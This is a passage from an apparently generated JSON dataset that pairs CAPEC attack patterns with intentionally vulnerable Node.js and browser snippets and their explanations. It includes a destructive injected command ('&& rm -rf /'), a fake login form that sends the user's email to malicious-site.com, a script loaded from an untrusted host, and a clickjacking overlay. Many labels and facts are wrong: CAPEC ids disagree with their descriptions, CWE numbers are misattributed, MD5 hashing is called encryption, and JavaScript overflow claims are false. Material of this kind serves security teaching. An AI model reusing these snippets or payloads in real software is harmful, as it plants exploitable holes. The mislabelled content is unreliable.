        "description": "This JavaScript code snippet demonstrates a vulnerability related to the CAPEC 'Using Escaped Slashes in Alternate Encoding' and associated CWEs. The function `readFile` takes a file path as input and attempts to read the file. Initially, it validates the input to ensure it is a string. It then canonicalizes the path by replacing backslashes with forward slashes. After canonicalization, it checks for path traversal attempts by looking for '..' in the path. If the path is deemed safe, it proceeds to read the file. This code is vulnerable because it validates the input before canonicalization, which can be exploited by an attacker using alternate encoding to bypass the validation checks."
    },
    {
        "capec_id": "79",
        "capec_name": "Using Slashes in Alternate Encoding",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction readFile(userInput) {\n  // Validate input (CWE-20)\n  if (!userInput || typeof userInput !== 'string') {\n    throw new Error('Invalid input');\n  }\n\n  // Canonicalize the path (CWE-180)\n  const canonicalPath = path.normalize(userInput);\n\n  // Validate the canonicalized path (CWE-22)\n  if (canonicalPath.includes('..') || canonicalPath.includes('\\\\') || canonicalPath.includes('/')) {\n    throw new Error('Invalid path');\n  }\n\n  // Read the file (CWE-73)\n  fs.readFile(canonicalPath, 'utf8', (err, data) => {\n    if (err) {\n      console.error('Error reading file:', err);\n      return;\n    }\n    console.log('File content:', data);\n  });\n}\n\n// Example usage\nreadFile('user\\input\\file.txt');",
        "description": "This JavaScript code snippet demonstrates a vulnerable file reading function that embodies the main idea of CAPEC-147: Using Slashes in Alternate Encoding. The function `readFile` takes user input for a file path and attempts to read the file. The code includes several CWE-related issues:\n\n1. **Improper Input Validation (CWE-20)**: The input is only checked for being a non-empty string, which is insufficient.\n2. **Incorrect Behavior Order: Validate Before Canonicalize (CWE-180)**: The input is validated before being canonicalized, which can lead to bypassing validation checks.\n3. **Improper Limitation of a Pathname to a Restricted Directory (CWE-22)**: The code attempts to validate the canonicalized path but does so incorrectly, allowing potential path traversal attacks.\n4. **External Control of File Name or Path (CWE-73)**: The user input directly influences the file path used in the filesystem operation, which can be exploited.\n\nThe code aims to highlight how improper handling of slashes and alternate encodings can lead to security vulnerabilities, such as path traversal and unauthorized file access."
    },
    {
        "capec_id": "80",
        "capec_name": "Using UTF-8 Encoding to Bypass Validation Logic",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/submit', (req, res) => {\n  const userInput = req.body.input;\n  // Validate input before canonicalization\n  if (!/^[a-zA-Z0-9]+$/.test(userInput)) {\n    return res.status(400).send('Invalid input');\n  }\n  // Canonicalize input (decode UTF-8)\n  const canonicalInput = decodeURIComponent(escape(userInput));\n  // Use the input in a file path\n  const filePath = `/uploads/${canonicalInput}.txt`;\n  res.send(`File path is: ${filePath}`);\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server that accepts POST requests at the '/submit' endpoint. The user input is first validated using a regular expression to ensure it only contains alphanumeric characters. However, this validation occurs before the input is canonicalized (decoded from UTF-8). This can lead to security issues if the input contains overlong UTF-8 sequences or other encoding tricks that bypass the initial validation. After validation, the input is canonicalized using `decodeURIComponent(escape(userInput))`, which can change the input's meaning. The canonicalized input is then used to construct a file path, demonstrating CWE-73 (External Control of File Name or Path). This code embodies the main idea of CAPEC-147 (Using UTF-8 Encoding to Bypass Validation Logic) by showing how improper handling of alternate encodings and incorrect behavior order (CWE-180) can lead to security vulnerabilities."
    },
    {
        "capec_id": "81",
        "capec_name": "Web Server Logs Tampering",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  const logEntry = `${new Date().toISOString()} - ${req.method} ${req.url} - ${req.headers['user-agent']}`;\n  fs.appendFile('server.log', logEntry + '\\n', (err) => {\n    if (err) throw err;\n  });\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end('Logged request');\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server logs each incoming request to a file named 'server.log'. The log entry includes the current timestamp, HTTP method, URL, and user-agent header. However, the code is vulnerable to log tampering attacks (CAPEC-117) because it does not properly neutralize or sanitize the input data before writing it to the log file. This can lead to various issues such as CRLF injection (CWE-93), improper output neutralization (CWE-117), and improper input validation (CWE-20). An attacker could exploit these vulnerabilities to inject malicious data into the log file, potentially masking other malicious activities or causing harm to log processing systems."
    },
    {
        "capec_id": "82",
        "capec_name": "DEPRECATED: Violating Implicit Assumptions Regarding XML Content (aka XML Denial of Service (XDoS))",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst xml2js = require('xml2js');\nconst app = express();\n\napp.use(bodyParser.text({ type: 'application/xml' }));\n\napp.post('/upload', (req, res) => {\n  const xml = req.body;\n  xml2js.parseString(xml, { explicitArray: false }, (err, result) => {\n    if (err) {\n      return res.status(400).send('Invalid XML');\n    }\n    // Process the XML data\n    res.send('XML processed successfully');\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an Express server that accepts XML data via a POST request. The XML data is parsed using the xml2js library without any validation against a schema, which embodies the CWE-112 (Missing XML Validation) vulnerability. Additionally, the code does not handle potential XML External Entity (XXE) attacks (CWE-611) or XML Entity Expansion (CWE-776), making it susceptible to various XML-based attacks. The main idea represented here is the lack of proper validation and security measures when processing XML content, which can lead to XML Denial of Service (XDoS) and other related vulnerabilities."
    },
    {
        "capec_id": "83",
        "capec_name": "XPath Injection",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst xml2js = require('xml2js');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  const xmlData = `<users><user><username>${username}</username><password>${password}</password></user></users>`;\n\n  xml2js.parseString(xmlData, (err, result) => {\n    if (err) {\n      res.status(500).send('Error parsing XML');\n      return;\n    }\n    // Simulate XPath query\n    const user = result.users.user.find(u => u.username[0] === username && u.password[0] === password);\n    if (user) {\n      res.send('Login successful');\n    } else {\n      res.send('Invalid credentials');\n    }\n  });\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));",
        "description": "This JavaScript code snippet demonstrates a vulnerable web application using Express.js that is susceptible to XPath Injection. The application accepts a username and password via a POST request to the '/login' endpoint. It constructs an XML string with the user-provided input and parses it using the xml2js library. The code then simulates an XPath query to find a matching user. However, the input is not properly sanitized, allowing an attacker to inject malicious XPath expressions. This can lead to unauthorized access or information disclosure, embodying the main idea of CAPEC-91 and related CWEs such as CWE-643 (XPath Injection) and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "84",
        "capec_name": "XQuery Injection",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nconst xml2js = require('xml2js');\nconst fs = require('fs');\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/search', (req, res) => {\n  const userInput = req.body.query;\n  const xquery = `for $x in doc('users.xml')/users/user where $x/name = '${userInput}' return $x`;\n  fs.readFile('users.xml', 'utf8', (err, data) => {\n    if (err) throw err;\n    xml2js.parseString(data, (err, result) => {\n      if (err) throw err;\n      // Simulate XQuery execution (vulnerable to injection)\n      const users = result.users.user.filter(user => user.name[0] === userInput);\n      res.send(users);\n    });\n  });\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));",
        "description": "This JavaScript code snippet demonstrates a vulnerable web application using Express.js. The application reads user input from a POST request and constructs an XQuery expression without proper input validation or neutralization. The constructed XQuery is used to search an XML file for user data. This code is vulnerable to XQuery Injection (CWE-652) because it directly incorporates user input into the query, allowing an attacker to manipulate the query structure. The code also highlights improper neutralization of special elements (CWE-74, CWE-707) and draws parallels to SQL Injection (CWE-89) and XPath Injection (CWE-643) vulnerabilities."
    },
    {
        "capec_id": "85",
        "capec_name": "AJAX Footprinting",
        "code_snippet": "function fetchData(url) {\n  var xhr = new XMLHttpRequest();\n  xhr.open('GET', url, true);\n  xhr.onreadystatechange = function() {\n    if (xhr.readyState == 4 && xhr.status == 200) {\n      var response = xhr.responseText;\n      document.getElementById('output').innerHTML = response;\n    }\n  };\n  xhr.send();\n}\n\n// Example usage\nfetchData('http://example.com/api/data');",
        "description": "This JavaScript code snippet demonstrates a basic AJAX request using the XMLHttpRequest object to fetch data from a given URL and display it in an HTML element with the ID 'output'. The code embodies the main idea of CAPEC-225 (AJAX Footprinting) by illustrating how frequent client-server roundtrips can be used to gather information about the target environment. The related CWEs provide context on potential vulnerabilities that could be exploited during this process, such as improper input validation (CWE-20), cross-site scripting (CWE-79), and improper encoding or escaping of output (CWE-116). In this example, the response from the server is directly inserted into the DOM without any sanitization, making it susceptible to XSS attacks if the response contains malicious scripts."
    },
    {
        "capec_id": "86",
        "capec_name": "XSS Through HTTP Headers",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  // Extracting a header value from the request\n  let userAgent = req.headers['user-agent'];\n\n  // Vulnerable code: directly using the header value in HTML without proper sanitization\n  res.writeHead(200, {'Content-Type': 'text/html'});\n  res.end(`<html><body><h1>Welcome!</h1><p>Your user agent is: ${userAgent}</p></body></html>`);\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server using Node.js. The server extracts the 'user-agent' header from incoming HTTP requests and directly embeds it into the HTML response without any sanitization. This represents the main idea of the CAPEC 'XSS Through HTTP Headers' by demonstrating how unvalidated data from HTTP headers can be used to generate web content, leading to potential XSS vulnerabilities. The related CWEs highlight the importance of proper input neutralization to prevent such attacks."
    },
    {
        "capec_id": "87",
        "capec_name": "Forceful Browsing",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Simulated user roles\nconst users = {\n  'user1': 'admin',\n  'user2': 'guest'\n};\n\n// Middleware to check authentication\nfunction checkAuth(req, res, next) {\n  const user = req.query.user;\n  if (user && users[user]) {\n    req.user = user;\n    next();\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n}\n\n// Middleware to check authorization\nfunction checkAdmin(req, res, next) {\n  if (users[req.user] === 'admin') {\n    next();\n  } else {\n    res.status(403).send('Forbidden');\n  }\n}\n\n// Public route\napp.get('/public', (req, res) => {\n  res.send('This is a public page');\n});\n\n// Admin route\napp.get('/admin', checkAuth, (req, res) => {\n  res.send('This is an admin page');\n});\n\n// Start the server\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This code snippet demonstrates a basic Express.js application with a vulnerability to forceful browsing. The application has two routes: a public route and an admin route. The admin route is intended to be protected by an authentication middleware (checkAuth), but it lacks proper authorization checks. This means that any authenticated user, regardless of their role, can access the admin route by directly entering the URL. This embodies the main idea of CAPEC-111 (Forceful Browsing) and highlights CWE-425 (Direct Request), CWE-285 (Improper Authorization), and CWE-693 (Protection Mechanism Failure)."
    },
    {
        "capec_id": "88",
        "capec_name": "OS Command Injection",
        "code_snippet": "const { exec } = require('child_process');\n\nfunction executeCommand(userInput) {\n  exec(`ls ${userInput}`, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.error(`stderr: ${stderr}`);\n  });\n}\n\n// Example usage\nexecuteCommand(''); // Safe input\nexecuteCommand('&& rm -rf /'); // Malicious input",
        "description": "This JavaScript code snippet demonstrates an OS Command Injection vulnerability. The `executeCommand` function takes user input and directly incorporates it into an `exec` call to list directory contents using the `ls` command. This is vulnerable to injection attacks because it does not properly neutralize special elements in the user input. An attacker can inject malicious commands, such as `&& rm -rf /`, to execute arbitrary commands on the underlying operating system. This example embodies the main idea of CAPEC-88 and related CWEs, particularly CWE-78 (Improper Neutralization of Special Elements used in an OS Command) and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "89",
        "capec_name": "Pharming",
        "code_snippet": "const http = require('http');\nconst dns = require('dns');\n\nhttp.createServer((req, res) => {\n  const targetHost = 'trustedbank.com';\n  const targetIP = '192.168.1.100';\n\n  dns.reverse(req.connection.remoteAddress, (err, hostnames) => {\n    if (err || !hostnames.includes(targetHost)) {\n      res.writeHead(403, {'Content-Type': 'text/plain'});\n      res.end('Access Denied');\n      return;\n    }\n\n    http.get(`http://${targetIP}`, (proxyRes) => {\n      let data = '';\n      proxyRes.on('data', (chunk) => { data += chunk; });\n      proxyRes.on('end', () => {\n        res.writeHead(200, {'Content-Type': 'text/html'});\n        res.end(data);\n      });\n    }).on('error', () => {\n      res.writeHead(500, {'Content-Type': 'text/plain'});\n      res.end('Internal Server Error');\n    });\n  });\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that attempts to validate the origin of incoming requests using reverse DNS resolution. The server checks if the hostname of the incoming request matches a trusted host ('trustedbank.com'). If the check fails, it denies access. If the check passes, it proxies the request to a target IP ('192.168.1.100'). This code embodies the concept of a pharming attack by demonstrating how an attacker could exploit weaknesses in origin validation (CWE-346) and reliance on reverse DNS resolution (CWE-350) to redirect users to a malicious site. The code also highlights the potential for client-side enforcement issues (CWE-602) and the risks of downloading code without integrity checks (CWE-494)."
    },
    {
        "capec_id": "90",
        "capec_name": "Reflection Attack in Authentication Protocol",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // Echo the received challenge back to the client\n    socket.write(data);\n  });\n});\n\nserver.listen(1337, '127.0.0.1');\n\nclient.connect(1337, '127.0.0.1', () => {\n  const challenge = 'CHALLENGE';\n  client.write(challenge);\n\n  client.on('data', (data) => {\n    if (data.toString() === challenge) {\n      console.log('Authentication successful');\n    } else {\n      console.log('Authentication failed');\n    }\n    client.destroy();\n  });\n});",
        "description": "This JavaScript code snippet demonstrates a simple reflection attack vulnerability in an authentication protocol. The server listens for incoming connections and echoes back any data it receives. The client sends a challenge string to the server and checks if the response matches the challenge. If it does, the client considers the authentication successful. This represents a reflection attack (CWE-301) where the server's response is simply a reflection of the client's challenge, allowing an attacker to gain access by replaying the challenge. The code also touches on CWE-303 (incorrect implementation of authentication algorithm) and CWE-294 (authentication bypass by capture-replay) by showing how a poorly implemented authentication mechanism can be exploited."
    },
    {
        "capec_id": "91",
        "capec_name": "DEPRECATED: XSS in IMG Tags",
        "code_snippet": "<html>\n<body>\n  <form method=\"post\" action=\"submit.php\">\n    <input type=\"text\" name=\"user_input\" />\n    <input type=\"submit\" />\n  </form>\n  <div id=\"output\"></div>\n  <script>\n    document.querySelector('form').onsubmit = function(e) {\n      e.preventDefault();\n      var userInput = document.querySelector('input[name=\"user_input\"]').value;\n      document.getElementById('output').innerHTML = '<img src=\"' + userInput + '\" />';\n    };\n  </script>\n</body>\n</html>",
        "description": "This code snippet demonstrates a vulnerable web application where user input is directly inserted into an IMG tag's src attribute without proper neutralization. The form takes user input and, upon submission, dynamically inserts it into the HTML content of the page. This can lead to XSS attacks if an attacker inputs a malicious script, such as 'javascript:alert(1)'. The code embodies the main idea of CAPEC-18 and related CWEs by showing improper neutralization of script in attributes of IMG tags (CWE-82), improper neutralization of alternate XSS syntax (CWE-87), and basic XSS vulnerabilities (CWE-80)."
    },
    {
        "capec_id": "92",
        "capec_name": "Forced Integer Overflow",
        "code_snippet": "function allocateBuffer(size) {\n  // CWE-190: Integer Overflow or Wraparound\n  var bufferSize = size + 1;\n  \n  // CWE-680: Integer Overflow to Buffer Overflow\n  var buffer = new ArrayBuffer(bufferSize);\n  var view = new Uint8Array(buffer);\n  \n  // CWE-120: Buffer Copy without Checking Size of Input\n  for (var i = 0; i <= size; i++) {\n    view[i] = 0x41; // Fill buffer with 'A'\n  }\n  \n  return buffer;\n}\n\n// Example usage\nvar size = 0xFFFFFFFF; // Large value to cause overflow\nvar buffer = allocateBuffer(size);",
        "description": "This JavaScript code snippet demonstrates a forced integer overflow vulnerability. The function `allocateBuffer` takes a `size` parameter and attempts to allocate a buffer of `size + 1` bytes. If `size` is set to a large value (e.g., 0xFFFFFFFF), adding 1 causes an integer overflow, resulting in a very small or negative buffer size. This can lead to a buffer overflow when the code tries to fill the buffer with data. The code embodies the main idea of the CAPEC by showing how an attacker can manipulate an integer variable to cause unexpected behavior, potentially leading to arbitrary code execution."
    },
    {
        "capec_id": "93",
        "capec_name": "Log Injection-Tampering-Forging",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst fs = require('fs');\n\napp.use(express.json());\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n\n  // Log the login attempt\n  fs.appendFile('server.log', `Login attempt: ${username}, Password: ${password}\\n`, (err) => {\n    if (err) throw err;\n  });\n\n  // Simulate login process\n  if (username === 'admin' && password === 'password') {\n    res.send('Login successful');\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a vulnerable logging mechanism in an Express.js application. The code logs user login attempts directly to a file without proper sanitization or neutralization of the input. This can lead to log injection attacks where an attacker can manipulate log entries by injecting special characters or control sequences. Additionally, sensitive information such as passwords is logged, which can expose sensitive data and aid attackers. This example embodies the CAPEC 'Log Injection-Tampering-Forging' by demonstrating how improper log handling can lead to security vulnerabilities, as described by the related CWEs."
    },
    {
        "capec_id": "94",
        "capec_name": "Adversary in the Middle (AiTM)",
        "code_snippet": "const http = require('http');\nconst net = require('net');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const target = url.parse(req.url);\n  const client = net.createConnection(target.port, target.hostname, () => {\n    client.write(`${req.method} ${target.path} HTTP/1.1\\r\\n` +\n                 `Host: ${target.hostname}\\r\\n` +\n                 `Connection: close\\r\\n\\r\\n`);\n  });\n\n  client.on('data', (data) => {\n    // Potentially modify data here (CWE-300)\n    res.write(data);\n  });\n\n  client.on('end', () => {\n    res.end();\n  });\n\n  req.on('data', (chunk) => {\n    // Potentially capture and replay data here (CWE-294)\n    client.write(chunk);\n  });\n\n  req.on('end', () => {\n    client.end();\n  });\n}).listen(8080);",
        "description": "This JavaScript code snippet sets up a basic HTTP proxy server using Node.js. The server listens for incoming HTTP requests and forwards them to the target server, effectively placing itself in the middle of the communication channel between the client and the server. This embodies the main idea of the 'Adversary in the Middle (AiTM)' attack pattern (CAPEC). The code allows for potential modification of data in transit (CWE-300) and could be used to capture and replay data (CWE-294). The proxy does not verify the identity of the endpoints (CWE-287), making it vulnerable to spoofing attacks (CWE-290)."
    },
    {
        "capec_id": "95",
        "capec_name": "WSDL Scanning",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  if (req.method === 'GET' && queryObject.wsdl) {\n    // Simulate exposure of sensitive WSDL information\n    const wsdlInfo = `<?xml version=\"1.0\"?>\n<definitions>\n  <service name=\"SensitiveService\">\n    <port name=\"SensitivePort\" binding=\"tns:SensitiveBinding\">\n      <soap:address location=\"http://example.com/sensitive\"/>\n    </port>\n  </service>\n</definitions>`;\n    res.writeHead(200, {'Content-Type': 'application/xml'});\n    res.end(wsdlInfo);\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server that listens for GET requests containing a 'wsdl' query parameter. If such a request is received, the server responds with a simulated WSDL file containing sensitive information about a web service. This demonstrates the vulnerability described in CAPEC-220 (WSDL Scanning) and related CWEs, such as CWE-651 (Exposure of WSDL File Containing Sensitive Information) and CWE-598 (Use of GET Request Method With Sensitive Query Strings). The code highlights how an attacker could exploit exposed WSDL files to gain insights into the web service's structure and potentially perform further attacks."
    },
    {
        "capec_id": "96",
        "capec_name": "Block Access to Libraries",
        "code_snippet": "const fs = require('fs');\n\nfunction readConfigFile(filePath) {\n  try {\n    if (!fs.existsSync(filePath)) {\n      throw new Error('Configuration file not found');\n    }\n    const data = fs.readFileSync(filePath, 'utf8');\n    return JSON.parse(data);\n  } catch (err) {\n    console.error('Error reading configuration file:', err.message);\n    // Fallback to default configuration\n    return { defaultConfig: true };\n  }\n}\n\nconst config = readConfigFile('/path/to/config.json');\nconsole.log('Configuration:', config);",
        "description": "This JavaScript code snippet demonstrates a scenario where an application attempts to read a configuration file using the 'fs' library. The 'readConfigFile' function checks if the file exists and reads its content. If the file is not found or an error occurs during reading, it catches the error and logs it, then falls back to a default configuration. This represents the CAPEC idea of handling blocked access to libraries (in this case, the file system library) and ensuring the application does not enter an insecure state. The related CWEs are illustrated by the potential issues of using non-ubiquitous APIs (CWE-589), improper error handling (CWE-119), and reliance on external libraries (CWE-829)."
    },
    {
        "capec_id": "97",
        "capec_name": "Cryptanalysis",
        "code_snippet": "const crypto = require('crypto');\n\n// Using a weak cryptographic algorithm (MD5)\nfunction encrypt(text) {\n  const hash = crypto.createHash('md5');\n  hash.update(text);\n  return hash.digest('hex');\n}\n\n// Weak Initialization Vector (IV)\nfunction generateWeakIV() {\n  return '1234567890123456'; // Predictable IV\n}\n\n// Using a predictable random number generator\nfunction getPredictableRandomNumber() {\n  return Math.floor(Math.random() * 100); // Not cryptographically secure\n}\n\n// Example usage\nconst plaintext = 'Sensitive Data';\nconst ciphertext = encrypt(plaintext);\nconst iv = generateWeakIV();\nconst randomNumber = getPredictableRandomNumber();\n\nconsole.log(`Ciphertext: ${ciphertext}`);\nconsole.log(`IV: ${iv}`);\nconsole.log(`Random Number: ${randomNumber}`);",
        "description": "This JavaScript code snippet demonstrates several cryptographic weaknesses as described in the CAPEC and related CWEs. The `encrypt` function uses the MD5 algorithm, which is considered broken and risky (CWE-327). The `generateWeakIV` function returns a predictable Initialization Vector (IV), which is a weak practice (CWE-1204). The `getPredictableRandomNumber` function uses `Math.random()`, which is not suitable for cryptographic purposes due to its predictability (CWE-1241). These vulnerabilities can be exploited by attackers to perform cryptanalysis and potentially decipher the ciphertext without knowing the secret key."
    },
    {
        "capec_id": "98",
        "capec_name": "Phishing",
        "code_snippet": "function redirectToPhishingSite() {\n  var userInput = prompt('Please enter your email to continue:');\n  var redirectUrl = 'http://malicious-site.com/login?email=' + encodeURIComponent(userInput);\n  window.location.href = redirectUrl;\n}\n\nfunction displayFakeLogin() {\n  document.body.innerHTML = '<h2>Login to Your Account</h2><form onsubmit=\"redirectToPhishingSite(); return false;\"><input type=\"text\" placeholder=\"Email\" required><input type=\"password\" placeholder=\"Password\" required><button type=\"submit\">Login</button></form>';\n}\n\ndisplayFakeLogin();",
        "description": "This JavaScript code snippet demonstrates a phishing attack by creating a fake login form that prompts the user to enter their email and password. When the form is submitted, the user is redirected to a malicious site with their email as a query parameter. This embodies the main idea of phishing (CAPEC) by masquerading as a legitimate login form to gather confidential information. The code also incorporates CWE-601 (URL Redirection to Untrusted Site) by redirecting the user to a malicious URL, and CWE-451 (User Interface Misrepresentation of Critical Information) by displaying a fake login form that misrepresents its true purpose."
    },
    {
        "capec_id": "99",
        "capec_name": "DEPRECATED: XML Parser Attack",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst xml2js = require('xml2js');\nconst app = express();\n\napp.use(bodyParser.text({ type: 'application/xml' }));\n\napp.post('/upload', (req, res) => {\n  const parser = new xml2js.Parser({ explicitArray: false });\n  parser.parseString(req.body, (err, result) => {\n    if (err) {\n      return res.status(400).send('Invalid XML');\n    }\n    // Process the XML data\n    res.send('XML processed successfully');\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an Express server that accepts XML data via a POST request. The XML data is parsed using the xml2js library. However, the code does not validate the XML against a schema (CWE-112), does not properly neutralize special elements (CWE-91), and does not restrict XML external entity references (CWE-611). This makes the application vulnerable to various XML-based attacks, such as XML Injection, XML External Entity (XXE) attacks, and processing of malicious XML payloads. The code represents the main idea of the deprecated CAPEC 'XML Parser Attack' by demonstrating how improper handling of XML can lead to security vulnerabilities."
    },
    {
        "capec_id": "100",
        "capec_name": "Overflow Buffers",
        "code_snippet": "function vulnerableFunction(input) {\n  var buffer = new Array(10);\n  for (var i = 0; i <= input.length; i++) {\n    buffer[i] = input[i];\n  }\n  console.log(buffer);\n}\n\n// Example usage\nvar userInput = 'A'.repeat(20); // Input longer than buffer size\nvulnerableFunction(userInput);",
        "description": "This JavaScript code snippet demonstrates a classic buffer overflow vulnerability. The function `vulnerableFunction` takes an `input` and attempts to copy its contents into a fixed-size buffer of length 10. However, the loop does not check if the input length exceeds the buffer size, leading to a buffer overflow when the input is longer than 10 characters. This can cause the program to write past the boundaries of the allocated buffer, potentially leading to a crash or arbitrary code execution. This example embodies the main idea of CAPEC-1000 (Overflow Buffers) and is related to CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer)."
    },
    {
        "capec_id": "101",
        "capec_name": "Server Side Include (SSI) Injection",
        "code_snippet": "const http = require('http');\nconst url = require('url');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const filePath = `./pages/${queryObject.page}.html`;\n\n  fs.readFile(filePath, 'utf8', (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/html'});\n      res.end('404 Not Found');\n      return;\n    }\n\n    // Vulnerable to SSI Injection\n    res.writeHead(200, {'Content-Type': 'text/html'});\n    res.end(data);\n  });\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads an HTML file based on user input from the URL query parameter 'page' and serves it as a response. The code is vulnerable to Server Side Include (SSI) Injection because it directly uses user input to construct the file path without proper validation or sanitization. An attacker could exploit this by providing a malicious 'page' parameter that includes SSI directives, leading to arbitrary code execution or information disclosure. This example also highlights related weaknesses such as improper input validation (CWE-20), improper neutralization of special elements (CWE-74), and unparsed raw web content delivery (CWE-433)."
    },
    {
        "capec_id": "102",
        "capec_name": "Session Sidejacking",
        "code_snippet": "const http = require('http');\nconst server = http.createServer((req, res) => {\n  if (req.url === '/login' && req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString();\n    });\n    req.on('end', () => {\n      const credentials = JSON.parse(body);\n      // Simulate authentication\n      if (credentials.username === 'user' && credentials.password === 'pass') {\n        const sessionToken = '123456'; // Insecure session token\n        res.setHeader('Set-Cookie', `sessionToken=${sessionToken}`);\n        res.end('Login successful');\n      } else {\n        res.end('Login failed');\n      }\n    });\n  } else {\n    res.end('Welcome');\n  }\n});\nserver.listen(8080, () => {\n  console.log('Server running on port 8080');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that handles a login request. When a user logs in with the correct credentials, the server responds with a session token set in a cookie. The session token is transmitted in cleartext and without the 'Secure' attribute, making it vulnerable to session sidejacking. An attacker could sniff the network traffic, capture the session token, and use it to impersonate the user. This code demonstrates vulnerabilities related to CWE-319 (Cleartext Transmission of Sensitive Information), CWE-522 (Insufficiently Protected Credentials), and CWE-614 (Sensitive Cookie in HTTPS Session Without 'Secure' Attribute)."
    },
    {
        "capec_id": "103",
        "capec_name": "Clickjacking",
        "code_snippet": "<html>\n<head>\n  <style>\n    iframe {\n      position: absolute;\n      top: 0;\n      left: 0;\n      width: 100%;\n      height: 100%;\n      opacity: 0;\n      z-index: 2;\n    }\n    button {\n      position: relative;\n      z-index: 1;\n    }\n  </style>\n</head>\n<body>\n  <button onclick=\"alert('Button Clicked!')\">Click Me!</button>\n  <iframe src=\"https://malicious-site.com\"></iframe>\n</body>\n</html>",
        "description": "This HTML and JavaScript code snippet demonstrates a basic clickjacking attack. The main idea is to trick the user into clicking a button that appears to be part of the legitimate UI, but in reality, the click is being captured by an invisible iframe overlaying the button. The iframe is set to be fully transparent and covers the entire page, making it impossible for the user to realize they are interacting with a different domain. This leverages CWE-1021 (Improper Restriction of Rendered UI Layers or Frames) by not restricting the iframe from another domain, leading to user confusion. The button click event is a placeholder to show where the user's intended action would be hijacked by the malicious iframe."
    },
    {
        "capec_id": "104",
        "capec_name": "Cross Zone Scripting",
        "code_snippet": "function loadUntrustedContent() {\n    var untrustedUrl = 'http://untrusted.example.com/malicious.js';\n    var script = document.createElement('script');\n    script.src = untrustedUrl;\n    document.body.appendChild(script);\n}\n\nfunction executeWithElevatedPrivileges() {\n    if (window.location.hostname === 'trusted.example.com') {\n        loadUntrustedContent();\n    }\n}\n\nexecuteWithElevatedPrivileges();",
        "description": "This JavaScript code snippet demonstrates a Cross Zone Scripting attack. The function `loadUntrustedContent` dynamically loads a script from an untrusted source. The `executeWithElevatedPrivileges` function checks if the current hostname is 'trusted.example.com' and, if so, calls `loadUntrustedContent`. This bypasses security zone controls by loading potentially malicious content with elevated privileges. The code embodies CWE-250 (Execution with Unnecessary Privileges) by performing operations with higher privileges than necessary, CWE-638 (Not Using Complete Mediation) by not rechecking access rights, CWE-285 (Improper Authorization) by not properly authorizing the script load, CWE-116 (Improper Encoding or Escaping of Output) by not encoding the URL, and CWE-20 (Improper Input Validation) by not validating the URL."
    },
    {
        "capec_id": "105",
        "capec_name": "HTTP Request Splitting",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  let userInput = req.url.split('?')[1]; // Assume user input is taken from URL query string\n  let headerValue = `User-Input: ${userInput}`;\n\n  // Vulnerable to HTTP Request Splitting\n  res.setHeader('X-Custom-Header', headerValue);\n  res.end('Response with custom header');\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
